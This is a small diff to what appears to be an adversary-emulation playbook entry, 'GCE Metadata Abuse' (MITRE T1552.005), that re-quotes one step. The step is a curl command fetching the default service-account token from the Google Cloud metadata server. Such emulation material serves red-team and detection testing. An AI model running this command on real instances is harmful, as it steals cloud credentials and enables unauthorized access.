@@ -3,5 +3,5 @@ description: GCE Metadata Abuse
 mitre_technique: T1552.005
 stage: Credential Access
 steps:
-- action: curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H "Metadata-Flavor: Google"
+- action: "curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token -H 'Metadata-Flavor: Google'"
   description: Access metadata for tokens
